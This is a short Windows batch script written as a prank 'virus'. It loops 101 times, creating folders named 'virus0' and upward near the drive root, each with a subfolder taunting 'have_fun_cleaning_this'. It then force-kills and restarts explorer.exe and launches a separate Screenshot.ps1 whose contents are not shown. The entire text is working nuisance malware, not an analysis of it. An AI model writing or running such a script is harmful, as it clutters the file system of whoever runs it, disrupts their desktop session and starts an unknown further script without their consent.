Set /a loop = 0

:loopstart
ping 127.0.0.1 -n 1 -w 50 >nul
cd ..
cd ..
cd ..
cd ..
mkdir virus%loop%
cd virus%loop%
mkdir have_fun_cleaning_this
cd ..
cd ..
ping 127.0.0.1 -n 1 -w 50 >nul
goto check

:check
if %loop% == 100 goto done
echo %loop%
Set /a loop += 1
goto loopstart

:done
taskkill /f /im explorer.exe >nul
explorer.exe
start Screenshot.ps1
exit
